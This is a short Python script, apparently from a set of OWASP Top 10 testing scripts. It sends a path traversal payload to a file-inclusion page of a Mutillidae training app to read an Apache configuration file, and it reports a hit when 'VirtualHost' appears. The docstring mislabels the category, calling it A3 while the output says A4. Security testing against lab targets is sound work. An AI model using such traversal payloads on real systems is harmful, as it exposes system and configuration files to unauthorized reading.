#!/usr/bin/env python
"""
This script is part of the scripts developed which test a Web Application against a number 
of vulnerabilities. It is a python implementation for the OWASP Top 10. 

This is focused on the A3:Broken Authentication and Session Management 

Threat Agents: Consider the types of users of your system. Do any users have only partial
access to certain types of system data?   


Example Usage: ./a4.py 

created by: Dr Ciphers
"""
import mechanize
import sys

exploit='../../../etc/apache2/sites-available/default'
url='http://192.168.1.10/mutillidae/index.php?page=arbitrary-file-inclusion.php'




browser = mechanize.Browser()
browser.set_handle_robots(False)

request_data = url.split('=')[0]

request_data += '=' + exploit

print '[!] Testing url %s' %request_data

response = browser.open(request_data)


if 'VirtualHost' in response.read():
    print '[+] The server is vulnerable to the A4-Insecure Direct Object References vulnerability'

